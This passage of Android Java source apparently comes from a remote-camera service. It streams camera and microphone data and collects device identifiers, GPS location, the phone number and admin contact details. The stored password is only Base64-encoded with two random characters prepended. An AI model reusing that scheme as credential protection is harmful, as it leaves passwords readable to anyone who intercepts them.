			 Log.d(TAG, "surfaceCreated()");
		 }

		 public void surfaceDestroyed(SurfaceHolder holder) {
		     // Surface will be destroyed when we return, so stop the preview.
		     // Because the CameraDevice object is not a shared resource, it's very
		     // important to release it when the activity is paused.
			 Log.d(TAG, "surfaceDestroyed()");
		 }

		 public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
		     // Now that the size is known, set up the camera parameters and begin
		     // the preview.
			 Log.d(TAG, "surfaceChanged(" + w + ", " + h +")");
		 }
	}

	class MyPreviewCallback implements PreviewCallback {
        public void onPreviewFrame(byte[] data, Camera cam) {
        	if (_instance.mSkipCamera) {
        		return;
        	}
        	
        	long now_time = System.currentTimeMillis();
        	if (now_time - mLastFrameTime < mFpsTimeInterval) {
        		return;
        	}
        	mLastFrameTime = now_time;
        	
        	try {
	        	//Log.d(TAG, "onPreviewFrame()...");
	        	Parameters param = m_camParam;
	        	int format = param.getPreviewFormat();
	        	Size size = param.getPreviewSize();
	        	int fps = param.getPreviewFrameRate();
	        	PutVideoData(data, data.length, format, size.width, size.height, fps);
        	} catch (Exception e) {
        		Log.d(TAG, "onPreviewFrame(avrtp) exception!!!");
        	}
        }
	}
    
    class AudioRecordThread implements Runnable { 
        public void run() {
        	int ret;
        	int bufferSize = 640;
        	byte[] buff = new byte[bufferSize];
        	
        	while (false == m_bQuitRecord && null != mAudioRecord)
        	{
        		//Log.d(TAG, "mAudioRecord.read()...");
        		ret = mAudioRecord.read(buff, 0, bufferSize);
        		//Log.d(TAG, "mAudioRecord.read() = " + ret + " bytes");
        		if (ret > 0) {
        			synchronized(mRecordQueue)
        			{
	        			if (mRecordQueue.size() >= 5)
	        			{
	        				mRecordQueue.removeFirst();
	        			}
	        			mRecordQueue.addLast(buff.clone());
        			}
        		}
        		else {
        			try {
						Thread.sleep(10);
					} catch (InterruptedException e) {}
        		}
        	}//while
        }
    }
    
    class AudioSendThread implements Runnable {
    	public void run () {
    		while (false == m_bQuitRecord)
    		{
    			byte[] buff = null;
    			
    			synchronized(mRecordQueue)
    			{
	    			if (mRecordQueue.size() > 0)
	    			{
		    			buff = mRecordQueue.removeFirst();
	    			}
    			}
    			
    			if (null != buff && buff.length > 0)
    			{
	    			PutAudioData(buff, buff.length);
    			}
    			else
    			{
    				try {
						Thread.sleep(10);
					} catch (InterruptedException e) {}
    			}
    		}//while
    	}
    }
    
    protected void setDisplayOrientation(Camera camera, int angle)
    {     
    	Method downPolymorphic;     
    	try     
    	{         
    		downPolymorphic = camera.getClass().getMethod("setDisplayOrientation", new Class[] { int.class });         
    		if (downPolymorphic != null) {
    			downPolymorphic.invoke(camera, new Object[] { angle });    
    		}
    	}     
    	catch (Exception e1)     
    	{     
    		
    	} 
    }
	
	private void record_h264_3gp()
	{
		File dir = new File("/data/data/" + getPackageName() + "/remotephone");
		if (false == dir.exists()) {
			dir.mkdir();
		}
		
		record_h264_3gp_sub(176, 144, 15);
		record_h264_3gp_sub(320, 240, 15);
		record_h264_3gp_sub(480, 320, 15);
		record_h264_3gp_sub(640, 480, 15);
	}
	
	private void record_h264_3gp_sub(int width, int height, int fps)
	{
		String path = String.format("/data/data/" + getPackageName() + "/remotephone/hw264_%dx%d.3gp", width, height);
		File file = new File(path);
		if (file.exists() && file.length() > 0) {
			return;
		}
		
		MediaRecorder recorder = new MediaRecorder();
		//recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        //recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        recorder.setVideoSize(width, height);
        recorder.setVideoFrameRate(fps);
        recorder.setPreviewDisplay(m_sfh.getSurface());
        recorder.setOutputFile(path);
        
        try {
            recorder.prepare();
            recorder.start();
            
            Thread.sleep(2000);
    		
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        try {            
            recorder.stop();
    		recorder.release();
    		
    		Thread.sleep(500);
    		
        } catch (Exception e) {
            e.printStackTrace();
        }
	}
	
    private int video_capture_start(int width, int height, int fps, int channel)
    {
    	m_isCaptureRunning = true;
    	
    	try {
    		if (Integer.parseInt(Build.VERSION.SDK) >= 9 && Camera.getNumberOfCameras() > 1) {
    			mCamera = Camera.open(1);
    		}
    		else {
    			mCamera = Camera.open();
    		}
        }
        catch (Exception e){
            return -1;
        }
    	
    	Camera.Parameters params = null;
    	try {
			mCamera.setPreviewDisplay(m_sfh);
			mCamera.setPreviewCallback(new MyPreviewCallback());

			params = mCamera.getParameters();
			params.setPictureFormat(PixelFormat.JPEG);
			//params.setPictureSize(1280, 720);
			//params.setPreviewFormat(PixelFormat.YCbCr_420_SP);
			mFpsTimeInterval = 100;
			if (0 != fps) {
				mFpsTimeInterval = 1000/fps;
				params.setPreviewFrameRate(fps);
			}
			if (0 != width && 0 != height) {
				params.setPreviewSize(width, height);
			}
			
			if (Integer.parseInt(Build.VERSION.SDK) >= 8) {
				setDisplayOrientation(mCamera, 90);
			}
			else {
				params.set("orientation", "portrait");
				params.set("rotation", 90);
			}
			
			mCamera.setParameters(params);
			
			mCamera.startPreview();
			
		} catch (Exception e) {
			try {
				params.setPictureFormat(PixelFormat.JPEG);
				//params.setPictureSize(1280, 720);
				params.setPreviewFrameRate(30);
				params.setPreviewSize(640, 480);
				
				mCamera.setParameters(params);
				
				mCamera.startPreview();
				
			} catch (Exception e2) {
	    		mCamera.release();
	    		mCamera = null;
				return -1;
			}
		}
    	
    	m_camParam = mCamera.getParameters();
    	
    	return 0;
    }
    
    public static int j_video_capture_start(int width, int height, int fps, int channel)
    {
    	if (_instance == null) {
    		return -1;
    	}
    	return _instance.video_capture_start(width, height, fps, channel);
    }
    
    private void video_capture_stop()
    {
    	if (m_isCaptureRunning == false) {
    		return;
    	}
    	
    	if (mCamera != null)
    	{
    		mCamera.setPreviewCallback(null);
    		mCamera.stopPreview();
    		mCamera.release();
    		mCamera = null;
    	}
    	
    	m_isCaptureRunning = false;
    }
    
    public static void j_video_capture_stop()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.video_capture_stop();
    }
    
    private void video_channel_switch(int channel)
    {
    	if (m_isCaptureRunning == false) {
    		return;
    	}
    	
    	if (mCamera == null) {
    		return;
    	}
    	
    	if (null != mMediaRecorder) {
    		return;
    	}
    	
    	if (Integer.parseInt(Build.VERSION.SDK) < 9 || Camera.getNumberOfCameras() <= 1) {
			return;
		}
    	
    	Camera.Parameters params = mCamera.getParameters();
    	int pictureFormat = params.getPictureFormat();
    	//Size pictureSize = params.getPictureSize();
    	//int previewFormat = params.getPreviewFormat();
    	Size previewSize = params.getPreviewSize();
    	int previewFps = params.getPreviewFrameRate();
    	
    	mCamera.setPreviewCallback(null);
		mCamera.stopPreview();
		mCamera.release();
		mCamera = null;
		
		
    	try {
    		mCamera = Camera.open(channel);
        }
        catch (Exception e){
        	mCamera = null;
            return;
        }
    	
    	try {
			mCamera.setPreviewDisplay(m_sfh);
			mCamera.setPreviewCallback(new MyPreviewCallback());
			
			params = mCamera.getParameters();
			params.setPictureFormat(pictureFormat);
			//params.setPictureSize(pictureSize.width, pictureSize.height);
			params.setPreviewSize(previewSize.width, previewSize.height);
			params.setPreviewFrameRate(previewFps);
			mCamera.setParameters(params);
			
			mCamera.startPreview();
			m_camParam = mCamera.getParameters();
			
		} catch (Exception e) {
    		mCamera.release();
    		mCamera = null;
			return;
		}
    }
    
    public static void j_video_switch(int param)
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.video_channel_switch(param);
    }
    
    private int hw264_capture_start(int width, int height, int fps, int channel)
    {
    	m_isCaptureRunning = true;
    	
    	try {
    		LocalServerSocket localServerSock = new LocalServerSocket("mobilecamera.hw264_socket");
    		// Blocking...
    		mSendSock = localServerSock.accept();
    		mSendSock.setSendBufferSize(1024*64);
    		localServerSock.close();
    		
    		if (Integer.parseInt(Build.VERSION.SDK) >= 9 && Camera.getNumberOfCameras() > 1) {
    			mCamera = Camera.open(channel);
    		}
    		else {
    			mCamera = Camera.open();
    		}
    		mCamera.unlock();
    		
    		if (mMediaRecorder == null)  
    		    mMediaRecorder = new MediaRecorder();
    		else  
    		    mMediaRecorder.reset();
    		
    		mMediaRecorder.setCamera(mCamera);
    		mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);  
    		mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//set video output format  
    		mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);//set Encoder 
    		//mMediaRecorder.setVideoFrameRate(fps);
    		mMediaRecorder.setVideoSize(width, height);
    		mMediaRecorder.setVideoEncodingBitRate(width * height * fps / 4);
    		
    		mMediaRecorder.setPreviewDisplay(m_sfh.getSurface());//set preview  
    		//mMediaRecorder.setMaxDuration(0);
    		//mMediaRecorder.setMaxFileSize(0);
    		mMediaRecorder.setOutputFile(mSendSock.getFileDescriptor());//set video output to socket, which is a
    		//mMediaRecorder.setOutputFile("/sdcard/stream01.h264");    //necessary way to transfer real-time video
    		
  		    mMediaRecorder.prepare();  
  		    mMediaRecorder.setOnInfoListener(this);
  		    mMediaRecorder.setOnErrorListener(this);
  		    mMediaRecorder.start();  	//start the mediarecorder
  		    
  		    try {
	  		    Parameters _param = mCamera.getParameters();
		      	Size _size = _param.getPreviewSize();
		      	int _fps = _param.getPreviewFrameRate();
		      	Log.d(TAG, "Real size: " + _size.width + "x" + _size.height + ", " + _fps + "fps");
		      	SetHWVideoParam(_size.width, _size.height, _fps);
  		    }
			catch (Exception e)
			{
				SetHWVideoParam(width, height, fps);
			}
        }
        catch (Exception e)
        {
        	SetHWVideoParam(0, 0, 0);
        	
        	e.printStackTrace();
        	        	
        	if (null != mMediaRecorder)
        	{
        		try {
	        		mMediaRecorder.reset();
	    		    mMediaRecorder.release();
        		} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
    		    mMediaRecorder = null;
        	}
        	
        	if (null != mCamera)
        	{
        		try {
	        		mCamera.lock();
	        		mCamera.release();
        		} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
        		mCamera = null;
        	}
        	
        	if (null != mSendSock)
        	{
        		try {
					mSendSock.close();
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
        		mSendSock = null;
        	}
        	
            return -1;
        }    	

    	return 0;
    }
    
    public static int j_hw264_capture_start(int width, int height, int fps, int channel)
    {
    	if (_instance == null) {
    		return -1;
    	}
    	return _instance.hw264_capture_start(width, height, fps, channel);
    }
    
    private void hw264_capture_stop()
    {
    	if (m_isCaptureRunning == false) {
    		return;
    	}
    	
    	if (null != mMediaRecorder)
    	{
	    	mMediaRecorder.stop();
		    //wait for a while
	        try {  
	            Thread.sleep(1000);
	        } catch (InterruptedException e1) {
	        	e1.printStackTrace();
	        }
		    mMediaRecorder.reset();
		    mMediaRecorder.release();
		    mMediaRecorder = null;
    	}
    	if (null != mCamera)
    	{
    		try {
	    		mCamera.lock();
	    		mCamera.release();
    		} catch (Exception e1) {
	        	e1.printStackTrace();
	        }
    		mCamera = null;
    	}
    	if (null != mSendSock)
    	{
    		try {
				mSendSock.close();
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
    		mSendSock = null;
    	}
    	
    	m_isCaptureRunning = false;
    }
    
    public static void j_hw264_capture_stop()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.hw264_capture_stop();
    }
    
    private int hw263_capture_start(int width, int height, int fps, int channel)
    {
    	m_isCaptureRunning = true;
    	
    	try {
    		LocalServerSocket localServerSock = new LocalServerSocket("mobilecamera.hw263_socket");
    		// Blocking...
    		mSendSock = localServerSock.accept();
    		mSendSock.setSendBufferSize(1024*64);
    		localServerSock.close();
    		
    		if (Integer.parseInt(Build.VERSION.SDK) >= 9 && Camera.getNumberOfCameras() > 1) {
    			mCamera = Camera.open(channel);
    		}
    		else {
    			mCamera = Camera.open();
    		}
    		mCamera.unlock();
    		
    		if (mMediaRecorder == null)  
    		    mMediaRecorder = new MediaRecorder();
    		else  
    		    mMediaRecorder.reset();
    		
    		mMediaRecorder.setCamera(mCamera);
    		mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);  
    		mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//set video output format  
    		mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H263);//set Encoder 
    		//mMediaRecorder.setVideoFrameRate(fps);
    		mMediaRecorder.setVideoSize(width, height);
    		mMediaRecorder.setVideoEncodingBitRate(width * height * fps);
    		
    		mMediaRecorder.setPreviewDisplay(m_sfh.getSurface());//set preview  
    		//mMediaRecorder.setMaxDuration(0);
    		//mMediaRecorder.setMaxFileSize(0);
    		mMediaRecorder.setOutputFile(mSendSock.getFileDescriptor());//set video output to socket, which is a
    		//mMediaRecorder.setOutputFile("/sdcard/stream01.h263");	//necessary way to transfer real-time video
    		
  		    mMediaRecorder.prepare();  
  		    mMediaRecorder.setOnInfoListener(this);
		    mMediaRecorder.setOnErrorListener(this);
  		    mMediaRecorder.start();  	//start the mediarecorder    		
        }
        catch (Exception e)
        {
        	e.printStackTrace();
        	
        	if (null != mMediaRecorder)
        	{
        		try {
	        		mMediaRecorder.reset();
	    		    mMediaRecorder.release();
        		} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
    		    mMediaRecorder = null;
        	}
        	
        	if (null != mCamera)
        	{
        		try {
	        		mCamera.lock();
	        		mCamera.release();
        		} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
        		mCamera = null;
        	}
        	
        	if (null != mSendSock)
        	{
        		try {
					mSendSock.close();
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
        		mSendSock = null;
        	}
        	
            return -1;
        }    	

    	return 0;
    }
    
    public static int j_hw263_capture_start(int width, int height, int fps, int channel)
    {
    	if (_instance == null) {
    		return -1;
    	}
    	return _instance.hw263_capture_start(width, height, fps, channel);
    }
    
    private void hw263_capture_stop()
    {
    	if (m_isCaptureRunning == false) {
    		return;
    	}
    	
    	if (null != mMediaRecorder)
    	{
	    	mMediaRecorder.stop();
		    //wait for a while
	        try {  
	            Thread.sleep(1000);
	        } catch (InterruptedException e1) {
	        	e1.printStackTrace();
	        }
		    mMediaRecorder.reset();
		    mMediaRecorder.release();
		    mMediaRecorder = null;
    	}
    	if (null != mCamera)
    	{
    		try {
	    		mCamera.lock();
	    		mCamera.release();
    		} catch (Exception e1) {
	        	e1.printStackTrace();
	        }
    		mCamera = null;
    	}
    	if (null != mSendSock)
    	{
    		try {
				mSendSock.close();
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
    		mSendSock = null;
    	}
    	
    	m_isCaptureRunning = false;
    }
    
    public static void j_hw263_capture_stop()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.hw263_capture_stop();
    }
    
    private int audio_record_start(int channel)
    {
    	try {
    		Thread.sleep(200);
    		
	    	int buffSize = AudioRecord.getMinBufferSize(
	    			8000,
	    			AudioFormat.CHANNEL_CONFIGURATION_MONO,
	    			AudioFormat.ENCODING_PCM_16BIT);
	    	
	    	mAudioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
	    			8000,
	    			AudioFormat.CHANNEL_CONFIGURATION_MONO,
	    			AudioFormat.ENCODING_PCM_16BIT,
	    			buffSize < 640*2 ? 640*2 : buffSize);
    	}
        catch (Exception e){
        	e.printStackTrace();
            return -1;
        }
    	
    	try {
    		mAudioRecord.startRecording();
    	}
        catch (Exception e){
        	e.printStackTrace();
        	mAudioRecord.release();
        	mAudioRecord = null;
            return -1;
        }
    	
    	m_bQuitRecord = false;
    	mRecordQueue.clear();
    	new Thread(new AudioRecordThread()).start();
    	new Thread(new AudioSendThread()).start();
    	
    	return 0;
    }
    
    public static int j_audio_record_start(int channel)
    {
    	if (_instance == null) {
    		return -1;
    	}
    	return _instance.audio_record_start(channel);
    }
    
    private void audio_record_stop()
    {
    	m_bQuitRecord = true;
    	
    	try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	
    	if (mAudioRecord != null)
    	{
    		mAudioRecord.stop();
	    	mAudioRecord.release();
	    	mAudioRecord = null;
    	}
    }
    
    public static void j_audio_record_stop()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.audio_record_stop();
    }
    
    public static int j_sensor_capture_start()
    {
    	return -1;
    }
    
    public static void j_sensor_capture_stop()
    {
    	
    }
    
    private void play_pcm_data(byte[] pcm_data)
    {
    	//AudioManager audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
    	//int max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
    	//int curr = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
    	
    	//audioManager.setSpeakerphoneOn(true);
    	//audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
    	
    	
    	int minBuffSize = AudioTrack.getMinBufferSize(
    			8000,
    			AudioFormat.CHANNEL_CONFIGURATION_MONO,
    			AudioFormat.ENCODING_PCM_16BIT);
    	
    	AudioTrack audiotrack = new AudioTrack(AudioManager.STREAM_MUSIC,
    			8000,
    			AudioFormat.CHANNEL_CONFIGURATION_MONO,
    			AudioFormat.ENCODING_PCM_16BIT,
    			minBuffSize * 8,
    			AudioTrack.MODE_STREAM);
    	
    	audiotrack.play();
    	
    	int ret;
    	int count = 0;
    	
    	while (count < pcm_data.length)
    	{
    		Log.d(TAG, "audiotrack.write( " + (pcm_data.length - count) + " bytes )");
    		ret = audiotrack.write(pcm_data, count, pcm_data.length - count);
    		Log.d(TAG, "audiotrack.write() ==> " + ret + " bytes )");
    		if (ret > 0) {
    			count += ret;
    		}
    		else {
    			try {
					Thread.sleep(10);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
    		}
    	}
    	
    	audiotrack.stop();
    	audiotrack.release();
    	
    	
    	//audioManager.setSpeakerphoneOn(false);
    	//audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, curr, 0);
    }
    
    public static void j_play_pcm_data(byte[] pcm_data)
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.play_pcm_data(pcm_data);
    }
    
    public static void j_contrl_take_picture()
    {
    }
    
    public static void j_contrl_zoom_in()
    {
    	if (_instance == null) {
    		return;
    	}
    	if (_instance.mCamera == null) {
    		return;
    	}
    	
    	try {
	    	Parameters params = _instance.mCamera.getParameters();
	    	int max = params.getMaxZoom();
	    	int value;
	    	//if (params.isSmoothZoomSupported()) {
	    		value = params.getZoom();
	    		value += max > 30 ? 2 : 1;
	    		if (value <= max) {
	    			params.setZoom(value);
	    			_instance.mCamera.setParameters(params);
	    		}
	    		Log.d(MobileCameraService.TAG, "MaxZoom=" + max + ", curr=" + value);
	    	//}
    	}
    	catch (Exception e) {}
    }
    
    public static void j_contrl_zoom_out()
    {
    	if (_instance == null) {
    		return;
    	}
    	if (_instance.mCamera == null) {
    		return;
    	}
    	
    	try {
	    	Parameters params = _instance.mCamera.getParameters();
	    	int max = params.getMaxZoom();
	    	int value;
	    	//if (params.isSmoothZoomSupported()) {
	    		value = params.getZoom();
	    		value -= max > 30 ? 2 : 1;
	    		if (value >= 0) {
	    			params.setZoom(value);
	    			_instance.mCamera.setParameters(params);
	    		}
	    		Log.d(MobileCameraService.TAG, "MaxZoom=" + max + ", curr=" + value);
	    	//}
    	}
    	catch (Exception e) {}
    }
    
    public static void j_contrl_flash_on()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.setFlashlightEnabled(true);
    }
    
    public static void j_contrl_flash_off()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.setFlashlightEnabled(false);
    }

    
    ////////////////////////////////////////////////////////////////////////////    
    public static final int WIFI_AP_STATE_DISABLING = 0;
    public static final int WIFI_AP_STATE_DISABLED = 1;
    public static final int WIFI_AP_STATE_ENABLING = 2;
    public static final int WIFI_AP_STATE_ENABLED = 3;
    public static final int WIFI_AP_STATE_FAILED = 4;
    
    public int getWifiApState(WifiManager wifiManager)
	{
    	try {
    		Method method = wifiManager.getClass().getMethod("getWifiApState");
    		int i = (Integer) method.invoke(wifiManager);
    	    if (i >= 10) {
    	    	i -= 10;//for Android 4.0.4
    	    }
    	    
    		return i;
    	} catch (Exception e) {
    		Log.i(TAG, "Can not get WiFi AP state" + e);
    		return WIFI_AP_STATE_DISABLED;
    	}
	}
    
    public boolean setWifiApEnabled(WifiManager wifiManager, boolean enabled)
    {
    	try {
    		/*
    		WifiConfiguration apConfig = new WifiConfiguration();
    		apConfig.SSID = "AndroidAP";
    		apConfig.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN);
    		apConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
    		apConfig.allowedProtocols.clear();
    		apConfig.allowedGroupCiphers.clear();
    		apConfig.allowedPairwiseCiphers.clear();
    		apConfig.wepKeys[0] = "";
    		apConfig.wepTxKeyIndex = 0;
    		*/
    		Method method = wifiManager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, Boolean.TYPE);             
    		boolean open = (Boolean) method.invoke(wifiManager, null/*apConfig*/, enabled);
    		return open;
    	} catch (Exception e) {
			Log.i(TAG, "Can not set WiFi AP state" + e);
			return false;
    	}
    }
    
    public static String genFakeMacAddr()
    {
    	String newid = null;
		do {
    		int temp = (int)(System.currentTimeMillis()/1000);
    		newid = String.format("%02X:%02X:%02X:%02X:%02X:%02X", 
    				(temp & 0x000000ff) >> 0,
    				(temp & 0x0000ff00) >> 8,
    				(temp & 0x00ff0000) >> 16,
    				(temp & 0xff000000) >> 24,
    				(byte)(Math.random() * 255),
    				(byte)(Math.random() * 255) 	);
		} while (newid.equals("00:00:00:00:00:00") || newid.equals("FF:FF:FF:FF:FF:FF") || newid.contains("C8:6F:1D"));
		
		return newid;
    }
    
    public static String j_get_device_uuid()
    {
    	if (_instance == null) {
    		return null;
    	}
    	
    	String saved_mac = AppSettings.GetSavedMacFromBackup(_instance);
        if (false == saved_mac.isEmpty())
        {
        	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SAVED_MAC, saved_mac);
        }
        
    	String macAddr = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SAVED_MAC, "");
    	if (null == macAddr || macAddr.equals(""))
    	{////////////////////////////////
    	
    	
    	WifiManager wifi = (WifiManager)_instance.getSystemService(Context.WIFI_SERVICE);
	    boolean bWifiEnabled = wifi.isWifiEnabled();
	    int apState = _instance.getWifiApState(wifi);
	    
	    if (WIFI_AP_STATE_DISABLED != apState)
	    {
	    	_instance.setWifiApEnabled(wifi, false);
	    	while (WIFI_AP_STATE_DISABLED != _instance.getWifiApState(wifi))
	    	{
		    	try {
					Thread.sleep(100);
				} catch (InterruptedException e) {  }
	    	}
	    }
	    
	    if (false == bWifiEnabled)
	    {
	    	wifi.setWifiEnabled(true);
	    	while (WifiManager.WIFI_STATE_ENABLED != wifi.getWifiState())
	    	{		    			    		
	    		try {
					Thread.sleep(100);
				} catch (InterruptedException e) {  }
	    	}
	    }
	    
    	WifiInfo info = wifi.getConnectionInfo();
    	if (null != info) {
    		macAddr = info.getMacAddress();
    	}
    	if (false == bWifiEnabled) {
    		wifi.setWifiEnabled(false);
    		while (WifiManager.WIFI_STATE_DISABLED != wifi.getWifiState())
	    	{		    			    		
	    		try {
					Thread.sleep(100);
				} catch (InterruptedException e) {  }
	    	}
	    }
    	if (WIFI_AP_STATE_DISABLED != apState) {
    		_instance.setWifiApEnabled(wifi, true);
    	}
    	
    	if (null == macAddr || macAddr.equals("") || macAddr.contains("00:00:00"))
    	{
    		macAddr = genFakeMacAddr();
    	}
    	//{
    	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SAVED_MAC, macAddr);
    	//}
    	
    	
    	}////////////////////////////////
    	else {
    		Log.i(TAG, "Read mac from AppSettings:" + macAddr);
    	}
    	
    	String tmDeviceId = "YKZ";
    	
    	return "ANDROID" + "@" + tmDeviceId + "@" + macAddr + "@" + "0";
    }

    public static String j_get_nodeid()
    {
    	if (_instance == null) {
    		return null;
    	}
    
    	String nodeid = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODEID, "");
    	if (nodeid.equals(""))
    	{
    		String newid = null;
    		do {
	    		int temp = (int)(System.currentTimeMillis()/1000);
	    		newid = String.format("%02X-%02X-%02X-%02X-%02X-%02X", 
	    				(temp & 0x000000ff) >> 0,
	    				(temp & 0x0000ff00) >> 8,
	    				(temp & 0x00ff0000) >> 16,
	    				(temp & 0xff000000) >> 24,
	    				(byte)(Math.random() * 255),
	    				(byte)(Math.random() * 255) 	);
    		} while (newid.equals("00-00-00-00-00-00") || newid.equals("FF-FF-FF-FF-FF-FF"));
    		
    		AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODEID, newid);
    		return newid;
    	}
    	else {
    		return nodeid;
    	}
    }
    
    public static String j_read_password()//orig pass
    {
    	if (_instance == null) {
    		return null;
    	}
    	return AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, "");
    }

    public static String j_read_nodename()
    {
    	if (_instance == null) {
    		return null;
    	}
    	return AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
    }
    
    public static String j_get_osinfo()
    {
    	if (_instance == null) {
    		return null;
    	}
    	
    	String strOS = "Android-" + Build.VERSION.RELEASE + "(" + Build.MODEL + ")";
    	strOS = strOS.replace("+", "-");
    	strOS = strOS.replace(" ", "-");
    	strOS = strOS.replace("&", "-");
    	
    	
    	Log.d("PutLocation", "mBaiduLongitude=" + _instance.mBaiduLongitude + ", mBaiduLatitude=" + _instance.mBaiduLatitude);
    	long lCurrTime = System.currentTimeMillis();
    	if (lCurrTime - _instance.mLastBaiduTime >= 2*60*1000) {
    		_instance.mMainHandler.post(new Runnable(){
    			@Override
    			public void run() {
    				try {
    	    			if (_instance.mLocationClient.isStarted() == false)
    	    			{
    			    		_instance.mLocationClient.start();
    	    			}
    		    		_instance.mLocationClient.requestLocation();
    		    		_instance.mLastBaiduTime = System.currentTimeMillis();
    	    		} catch (Exception e) {  }
    			}
    		});
    	}
    	
    	String strGPSLongi = "";
    	String strGPSLati  = "";
    	if (Math.abs(_instance.mBaiduLongitude) >= 0.01 || Math.abs(_instance.mBaiduLatitude) >= 0.01) {
        	strGPSLongi += String.format("%.5f", _instance.mBaiduLongitude);
        	strGPSLati  += String.format("%.5f", _instance.mBaiduLatitude);
    	}
    	else if (false == _instance.mLocationEnabled) {
    		strGPSLongi += "NONE";
    		strGPSLati  += "NONE";
    	}
    	else if (Math.abs(_instance.mLocLongitude) < 0.01 && Math.abs(_instance.mLocLatitude) < 0.01) {
    		Location lastLoc = _instance.mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
    		if (null != lastLoc)
			{
    			_instance.mLocLongitude = lastLoc.getLongitude();
	        	_instance.mLocLatitude = lastLoc.getLatitude();
				Log.d(TAG, lastLoc.toString());
	        	strGPSLongi += String.format("%.4f", _instance.mLocLongitude);
	        	strGPSLati  += String.format("%.4f", _instance.mLocLatitude);
			}
    		else {
        		strGPSLongi += "NONE";
        		strGPSLati  += "NONE";
    		}
    	}
    	else {
        	strGPSLongi += String.format("%.4f", _instance.mLocLongitude);
        	strGPSLati  += String.format("%.4f", _instance.mLocLatitude);
    	}
    	
    	String pass  = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, "");
    	if (pass == null || true == pass.equals("")) {
    		pass = "NONE";
    	}
    	String strPasswd = Base64.encodeToString(pass.getBytes(), Base64.NO_WRAP);
		Random rdm = new Random(System.currentTimeMillis());
		int temp_index = Math.abs(rdm.nextInt()) % (strPasswd.length() - 1);
		int temp_index2 = Math.abs(rdm.nextInt()) % (strPasswd.length() - 1);
		strPasswd = strPasswd.substring(temp_index, temp_index + 1) 
				+   strPasswd.substring(temp_index2, temp_index2 + 1)
				+ strPasswd;
    	
    	String strPhoneNum	= "NONE";
    	TelephonyManager tm = (TelephonyManager)_instance.getSystemService(Context.TELEPHONY_SERVICE);
    	String te1  = tm.getLine1Number();
    	if (te1 != null && false == te1.equals("")) {
    		strPhoneNum = te1;
    		strPhoneNum = strPhoneNum.replace("@", "#");
    		strPhoneNum = strPhoneNum.replace("+", "");
    		strPhoneNum = strPhoneNum.replace(" ", "");
    		strPhoneNum = strPhoneNum.replace("&", "");
    	}
    	
    	String str_adminPhone	= AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
    	if (str_adminPhone != null && false == str_adminPhone.equals("")) {
    		str_adminPhone = str_adminPhone.replace("@", "#");
    		str_adminPhone = str_adminPhone.replace("+", "");
    		str_adminPhone = str_adminPhone.replace(" ", "");
    		str_adminPhone = str_adminPhone.replace("&", "");
    	}
    	else {
    		str_adminPhone = "NONE";
    	}
    	
    	
    	String str_adminEmail = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
    	if (str_adminEmail != null && false == str_adminEmail.equals("")) {
    		str_adminEmail = str_adminEmail.replace("@", "#");
    		str_adminEmail = str_adminEmail.replace("+", "");
    		str_adminEmail = str_adminEmail.replace(" ", "");
